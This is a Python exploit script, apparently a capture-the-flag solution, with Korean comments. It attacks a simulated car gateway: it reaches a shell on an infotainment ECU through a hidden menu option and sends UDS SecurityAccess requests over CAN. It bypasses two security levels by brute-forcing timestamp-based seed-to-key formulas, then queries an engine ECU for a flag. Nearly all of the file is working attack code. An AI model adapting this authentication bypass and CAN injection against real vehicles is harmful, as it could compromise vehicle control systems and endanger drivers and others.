#!/usr/bin/env python3

from pwn import *
import time
import struct
import hashlib
import re
import sys
from collections import defaultdict

context.log_level = 'info'

class GatewayExploit:
    def __init__(self, host='localhost', port=24963, session_id=None):
        self.host = host
        self.port = port
        self.session_id = session_id
        self.conn = None  # 명령어 실행용 연결
        self.dump_conn = None  # candump용 연결
        
        self.timing_data = defaultdict(list)
        self.seed_history = []
        
        if not session_id:
            log.warning("Session ID is required!")
            sys.exit(1)
            
        log.info(f"Gateway exploit initialized - Session: {session_id}")
    
    def connect_to_ecu(self):
        """ECU에 연결하여 쉘 접근"""
        try:
            conn = remote(self.host, self.port)
            
            # Id 입력 대기
            conn.recvuntil(b'Id:')
            conn.sendline(b"a")
            
            # Password 입력 대기  
            conn.recvuntil(b'Password:')
            conn.sendline(b"a")
            
            # 메뉴 출력 대기
            conn.recvuntil(b'Choice: > ')
            
            # 4번 선택 (숨겨진 옵션)
            conn.sendline(b"4")
            
            # 쉘 접근 성공
            time.sleep(0.5)
            return conn
            
        except Exception as e:
            log.warning(f"ECU connection failed: {e}")
            return None

    def connect(self):
        """인포테인먼트 ECU에 연결 (명령어용 + candump용)"""
        try:
            # 첫 번째 연결: 명령어 실행용
            log.info("Connecting to ECU for command execution...")
            self.conn = self.connect_to_ecu()
            if not self.conn:
                return False
            log.success("Command connection established")
            
            # 두 번째 연결: candump용
            log.info("Connecting to ECU for CAN monitoring...")
            self.dump_conn = self.connect_to_ecu()
            if not self.dump_conn:
                return False
            log.success("CAN dump connection established")
            
            # candump 시작
            log.info("Starting candump...")
            self.dump_conn.sendline(b"candump can0 &")
            time.sleep(1)
            
            log.success("Dual ECU connections ready!")
            return True
            
        except Exception as e:
            log.warning(f"Connection setup failed: {e}")
            return False
    
    def execute_command(self, cmd, timeout=3):
        """명령어 실행 (프롬프트 없는 쉘)"""
        log.debug(f"Executing: {cmd}")
        self.conn.sendline(cmd.encode())
        
        try:
            # 명령어 실행 결과를 읽기 (프롬프트가 없으므로 timeout으로 처리)
            time.sleep(0.5)  # 명령어 실행 대기
            result = self.conn.recv(timeout=timeout)
            output = result.decode().strip()
            
            # 입력한 명령어 echo 제거
            lines = output.split('\n')
            if lines and lines[0].strip() == cmd.strip():
                output = '\n'.join(lines[1:]).strip()
            
            return output
        except:
            return ""
    
    def send_can_message(self, can_id, data_hex):
        """CAN 메시지 전송"""
        cmd = f"cansend can0 {can_id:03X}#{data_hex}"
        self.execute_command(cmd)
        log.debug(f"CAN TX: {can_id:03X}#{data_hex}")
    
    def read_can_response(self, timeout=3):
        """CAN 응답 읽기 (멀티프레임 지원)"""
        try:
            frames = []
            start_time = time.time()
            expecting_continuation = False
            
            while time.time() - start_time < timeout:
                try:
                    data = self.dump_conn.recv(timeout=0.5)
                    output = data.decode()
                    
                    lines = output.split('\n')
                    for line in lines:
                        if '7E8' in line and 'vcan0' in line:
                            log.debug(f"CAN RX: {line.strip()}")
                            
                            # CAN 데이터 파싱: (timestamp) vcan0 7E8#1067014EDE000000
                            hex_match = re.search(r'7E8#([0-9A-Fa-f]+)', line)
                            if hex_match:
                                hex_data = hex_match.group(1)
                                try:
                                    frame_data = bytes.fromhex(hex_data)
                                    
                                    # First Frame 감지 (0x10)
                                    if frame_data[0] == 0x10:
                                        log.debug(f"First frame detected: {frame_data.hex()}")
                                        frames = [frame_data]  # 새로운 멀티프레임 시작
                                        expecting_continuation = True
                                        continue
                                    
                                    # Continuation Frame (0x21)
                                    elif frame_data[0] == 0x21 and expecting_continuation:
                                        log.debug(f"Continuation frame detected: {frame_data.hex()}")
                                        frames.append(frame_data)
                                        
                                        # 2개 프레임이면 재조립 시도
                                        if len(frames) >= 2:
                                            reassembled = self.reassemble_multiframe(frames)
                                            if reassembled:
                                                log.debug(f"Reassembled data: {reassembled.hex()}")
                                                return reassembled
                                    
                                    # Single Frame (0x0X)
                                    elif frame_data[0] & 0xF0 == 0x00:
                                        log.debug(f"Single frame detected: {frame_data.hex()}")
                                        return frame_data
                                        
                                except ValueError as e:
                                    log.debug(f"Hex decode error: {e}")
                                    continue
                except Exception as e:
                    log.debug(f"Recv error: {e}")
                    continue
            
            log.debug("Timeout - no complete response received")
            return None
            
        except Exception as e:
            log.debug(f"CAN read error: {e}")
            return None
    
    def reassemble_multiframe(self, frames):
        """멀티프레임 재조립"""
        if len(frames) < 2:
            return None
            
        first_frame = frames[0]
        continuation_frame = frames[1]
        
        log.debug(f"Reassembling frames:")
        log.debug(f"  First: {first_frame.hex()}")
        log.debug(f"  Continuation: {continuation_frame.hex()}")
        
        # First Frame: 10 67 01 4EDE 0000 00
        # Continuation: 21 381A 0000 0000 0000
        
        # UDS 데이터 추출
        # First frame에서: SID(0x67) + Sub-function(0x01) + 시드 상위 2바이트
        # Continuation에서: 시드 하위 2바이트
        
        if first_frame[1] == 0x67:  # Positive response
            sub_function = first_frame[2]
            seed_high = struct.unpack('>H', first_frame[3:5])[0]  # 상위 2바이트
            seed_low = struct.unpack('>H', continuation_frame[1:3])[0]  # 하위 2바이트
            
            # 4바이트 시드 조합
            full_seed = (seed_high << 16) | seed_low
            
            log.debug(f"Seed parts: high=0x{seed_high:04X}, low=0x{seed_low:04X}")
            log.debug(f"Full seed: 0x{full_seed:08X}")
            
            # UDS 응답 재구성: [길이][SID][Sub][시드 4바이트]
            reassembled = struct.pack('>BBBL', 0x06, 0x67, sub_function, full_seed)
            return reassembled
        
        return None
    
    def send_uds_request(self, service_id, sub_function, data=b''):
        """UDS 요청 전송"""
        # PCI 계산: 데이터 길이 + SID + Sub-function
        pci = len(data) + 2
        uds_data = struct.pack('>BBB', pci, service_id, sub_function) + data
        
        # CAN 프레임은 8바이트로 패딩
        uds_hex = uds_data.hex().upper().ljust(16, '0')
        
        log.debug(f"UDS Request: PCI={pci:02X}, SID={service_id:02X}, Sub={sub_function:02X}, Data={data.hex()}")
        log.debug(f"Full CAN frame: {uds_hex}")
        
        start_time = time.perf_counter()
        self.send_can_message(0x7DF, uds_hex)
        response = self.read_can_response()
        end_time = time.perf_counter()
        
        response_time = end_time - start_time
        return response, response_time
    
    def request_seed(self, level):
        """시드 요청 (멀티프레임 응답 처리)"""
        log.info(f"Requesting seed for security level 0x{level:02X}")
        
        response, response_time = self.send_uds_request(0x27, level)
        
        if response and len(response) >= 7:
            # 재조립된 UDS 응답: [길이][SID][Sub][시드 4바이트]
            if response[1] == 0x67:  # Positive response
                seed = struct.unpack('>I', response[3:7])[0]
                timestamp = int(time.time())
                
                log.success(f"Seed: 0x{seed:08X} (time: {response_time:.4f}s)")
                
                self.seed_history.append({
                    'level': level,
                    'seed': seed,
                    'timestamp': timestamp,
                    'response_time': response_time
                })
                
                return seed, timestamp
        
        elif response and len(response) >= 4 and response[1] == 0x7F:
            error_code = response[3]
            error_names = {
                0x12: "Sub-function not supported",
                0x22: "Conditions not correct",
                0x31: "Request out of range", 
                0x33: "Security access denied",
                0x35: "Invalid key",
                0x36: "Exceeded number of attempts",
                0x37: "Required time delay not expired"
            }
            error_name = error_names.get(error_code, f"Unknown 0x{error_code:02X}")
            log.warning(f"UDS Error: {error_name}")
        
        else:
            log.warning(f"No valid response received (got {len(response) if response else 0} bytes)")
            if response:
                log.debug(f"Response data: {response.hex()}")
        
        return None, None
    
    def send_key(self, level, key):
        """키 전송 및 타이밍 분석"""
        log.info(f"Sending key for level 0x{level:02X}: 0x{key:08X}")
        
        # 키를 4바이트로 패킹
        key_data = struct.pack('>I', key)
        
        log.debug(f"Key data: {key_data.hex()}")
        
        response, response_time = self.send_uds_request(0x27, level + 1, key_data)
        
        self.timing_data[level].append((key, response_time))
        
        if response and len(response) >= 3:
            if response[1] == 0x67:  # Positive response
                log.success(f"✓ Key accepted! Level 0x{level:02X} unlocked (time: {response_time:.4f}s)")
                return True
            elif response[1] == 0x7F:  # Negative response
                if len(response) >= 4:
                    error_code = response[3]
                    error_names = {
                        0x12: "Sub-function not supported",
                        0x13: "Incorrect message length",
                        0x22: "Conditions not correct",
                        0x31: "Request out of range",
                        0x33: "Security access denied", 
                        0x35: "Invalid key",
                        0x36: "Exceeded number of attempts",
                        0x37: "Required time delay not expired"
                    }
                    error_name = error_names.get(error_code, f"Unknown 0x{error_code:02X}")
                    log.warning(f"UDS Error: {error_name}")
                
        log.warning(f"✗ Key rejected (time: {response_time:.4f}s)")
        return False
    
    def attack_level(self, level):
        """특정 레벨 공격 (타임스탬프 역산 적용)"""
        log.info(f"{'='*20} ATTACKING LEVEL 0x{level:02X} {'='*20}")
        
        if level == 0x01:
            # Level 1 전용 로직: 빠른 타임스탬프 역산
            log.info("Level 1: Fast timestamp reverse engineering...")
            
            max_attempts = 3  # 최대 3번의 시드 요청
            
            for attempt in range(max_attempts):
                log.info(f"Attempt {attempt + 1}/{max_attempts}")
                
                # 시드 요청
                seed, current_timestamp = self.request_seed(level)
                if seed is None:
                    continue
                
                log.info(f"Seed: 0x{seed:08X}, Current time: {current_timestamp}")
                
                # 빠른 시도: 가능성 높은 오프셋부터 (0~10초 전)
                likely_offsets = [3, 4, 5, 2, 6, 1, 7, 0, 8, 9, 10]  # 3-4초가 가장 가능성 높음
                
                for offset in likely_offsets:
                    test_timestamp = current_timestamp - offset
                    time_factor = test_timestamp & 0xFF
                    
                    # Level 1 키 계산: (seed ^ 0xA5A5A5A5) + time_factor
                    key = ((seed ^ 0xA5A5A5A5) + time_factor) & 0xFFFFFFFF
                    
                    log.info(f"  Testing offset {offset}s: factor=0x{time_factor:02X}, key=0x{key:08X}")
                    
                    if self.send_key(level, key):
                        log.success(f"SUCCESS! Offset: {offset}s, Timestamp: {test_timestamp}")
                        return True
                    
                    # 빠른 시도를 위해 대기 시간 단축
                    time.sleep(0.1)
                
                log.warning(f"Attempt {attempt + 1} failed, requesting new seed...")
                time.sleep(1)  # 잠깐 대기 후 새 시드 요청
            
            log.warning("All attempts failed for Level 1")
            return False
            
        elif level == 0x03:
            # Level 3 전용 로직: 시드 생성 타이밍 역산
            log.info("Level 3: Seed generation timestamp reverse engineering...")
            
            max_attempts = 3  # 최대 3번의 시드 요청
            
            for attempt in range(max_attempts):
                log.info(f"Attempt {attempt + 1}/{max_attempts}")
                
                # 시드 요청
                seed, current_timestamp = self.request_seed(level)
                if seed is None:
                    continue
                
                log.info(f"Seed: 0x{seed:08X}, Current time: {current_timestamp}")
                
                # Level 1에서 학습한 오프셋 적용 (보통 3-5초 전)
                likely_offsets = [3, 4, 5, 2, 6, 1, 7, 0, 8, 9, 10]
                
                for offset in likely_offsets:
                    # 시드 생성 시점 추정
                    seed_generation_time = current_timestamp - offset
                    
                    # Level 3 키 계산 공식: ROL3(seed ^ 0x5A5A5A5A) + (timestamp & 0xFFFF) * 0x9E3779B9
                    step1 = seed ^ 0x5A5A5A5A
                    step2 = ((step1 << 3) | (step1 >> 29)) & 0xFFFFFFFF
                    step3 = step2 + ((seed_generation_time & 0xFFFF) * 0x9E3779B9)
                    key = step3 & 0xFFFFFFFF
                    
                    log.info(f"  Testing offset {offset}s: seed_time={seed_generation_time}, key=0x{key:08X}")
                    
                    if self.send_key(level, key):
                        log.success(f"SUCCESS! Offset: {offset}s, Seed timestamp: {seed_generation_time}")
                        return True
                    
                    # 빠른 시도를 위해 대기 시간 단축
                    time.sleep(0.1)
                
                log.warning(f"Attempt {attempt + 1} failed, requesting new seed...")
                time.sleep(1)  # 잠깐 대기 후 새 시드 요청
            
            log.warning("All attempts failed for Level 3")
            return False
            
        else:
            log.warning(f"Unknown level: 0x{level:02X}")
            return False
    
    def test_engine_access(self):
        """엔진 ECU 접근 테스트"""
        log.info("Testing engine ECU access...")
        
        # 엔진 ECU 접근 시도 (CAN ID 0x456)
        engine_data = struct.pack('>BBH', 0x03, 0x22, 0xF190)
        engine_hex = engine_data.hex().upper().ljust(16, '0')
        
        start_time = time.perf_counter()
        self.send_can_message(0x456, engine_hex)
        
        # 엔진 응답 확인 (candump 연결에서)
        engine_response_ids = [0x458, 0x45A, 0x45C, 0x460]
        timeout = 5
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            try:
                data = self.dump_conn.recv(timeout=1)
                output = data.decode()
                
                for response_id in engine_response_ids:
                    if f"{response_id:03X}" in output:
                        log.success(f"Engine ECU response received from ID 0x{response_id:03X}!")
                        log.success(f"Response: {output.strip()}")
                        
                        # 플래그 추출 시도
                        hex_match = re.search(r'[0-9A-Fa-f\s]{16,}', output)
                        if hex_match:
                            try:
                                hex_data = hex_match.group().replace(' ', '')
                                response_bytes = bytes.fromhex(hex_data)
                                
                                # ASCII 변환 시도
                                flag_text = response_bytes.decode('ascii', errors='ignore')
                                if 'FLAG{' in flag_text or 'CTF{' in flag_text or 'flag{' in flag_text:
                                    log.success(f"🚩 FLAG FOUND: {flag_text}")
                                else:
                                    log.info(f"Response data: {flag_text}")
                            except:
                                pass
                        
                        return True
                        
            except:
                continue
        
        log.warning("No engine ECU response - access denied")
        return False
    
    def timing_analysis(self):
        """타이밍 공격 분석"""
        log.info("Performing timing analysis...")
        
        for level, timing_list in self.timing_data.items():
            if timing_list:
                log.info(f"Level 0x{level:02X} timing data:")
                
                for key, timing in timing_list:
                    log.info(f"  Key 0x{key:08X}: {timing:.4f}s")
                
                avg_time = sum(t[1] for t in timing_list) / len(timing_list)
                fast_responses = [t for t in timing_list if t[1] < avg_time - 0.01]
                
                log.info(f"  Average time: {avg_time:.4f}s")
                if fast_responses:
                    log.warning(f"  Fast responses detected: {len(fast_responses)}")
    
    def show_summary(self):
        """공격 결과 요약"""
        log.info("="*60)
        log.info("ATTACK SUMMARY")
        log.info("="*60)
        
        log.info(f"Session ID: {self.session_id}")
        log.info(f"Total seeds requested: {len(self.seed_history)}")
        
        for entry in self.seed_history:
            log.info(f"  Level 0x{entry['level']:02X}: Seed 0x{entry['seed']:08X} at {entry['timestamp']}")
        
        if self.timing_data:
            log.info("Timing attack data collected:")
            for level, data in self.timing_data.items():
                log.info(f"  Level 0x{level:02X}: {len(data)} attempts")
    
    def run_full_exploit(self):
        """전체 공격 실행"""
        log.info("🚗 Starting Gateway Authentication Exploit 🚗")
        log.info(f"Target: {self.host}:{self.port}")
        log.info(f"Session: {self.session_id}")
        
        if not self.connect():
            return False
        
        try:
            # CAN 인터페이스 확인
            can_check = self.execute_command("ip link show can0")
            if "can0" in can_check:
                log.success("CAN interface found")
            else:
                log.warning("CAN interface not found, but continuing...")
            
            # Level 1 공격
            if self.attack_level(0x01):
                log.success("🔓 Level 1 authentication bypassed!")
                time.sleep(1)
                
                # Level 3 공격  
                if self.attack_level(0x03):
                    log.success("🔓 Level 3 authentication bypassed!")
                    time.sleep(1)

                        
                    time.sleep(1)
                    # 엔진 ECU 접근
                    if self.test_engine_access():
                        log.success("🏁 ENGINE ECU COMPROMISED! 🏁")
                        log.success("🏆 CHALLENGE COMPLETED! 🏆")
                        
                        self.show_summary()
                        return True
            
            # 실패한 경우 타이밍 분석
            self.timing_analysis()
            self.show_summary()
            log.warning("❌ Exploit failed - not all levels unlocked")
            return False
            
        except KeyboardInterrupt:
            log.warning("Exploit interrupted by user")
            return False
        except Exception as e:
            log.warning(f"Exploit failed with error: {e}")
            import traceback
            traceback.print_exc()
            return False
        finally:
            # 연결 정리
            if self.conn:
                self.conn.close()
            if self.dump_conn:
                self.dump_conn.close()

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Gateway Authentication Exploit')
    parser.add_argument('--host', default='localhost', help='Target host')
    parser.add_argument('--port', type=int, default=27708, help='Target port (from API response)')
    parser.add_argument('--session', default='session_1750043538_9512', help='Session ID (from API response)')
    parser.add_argument('--debug', action='store_true', help='Enable debug logging')
    
    args = parser.parse_args()
    
    if args.debug:
        context.log_level = 'debug'
    
    log.info(f"Using session ID from CTF API: {args.session}")
    log.info(f"Connecting to infotainment ECU: {args.host}:{args.port}")
    
    exploit = GatewayExploit(args.host, args.port, args.session)
    
    if exploit.run_full_exploit():
        log.success("\n" + "="*60)
        log.success("🔥 GATEWAY COMPLETELY COMPROMISED! 🔥")
        log.success("🚗 VEHICLE SECURITY BYPASSED! 🚗")
        log.success("🏆 CTF CHALLENGE SOLVED! 🏆")
        log.success("="*60)
        sys.exit(0)
    else:
        log.warning("\n" + "="*60)
        log.warning("❌ EXPLOIT FAILED")
        log.warning("Check session ID or try manual analysis")
        log.warning("="*60)
        sys.exit(1)

if __name__ == "__main__":
    main()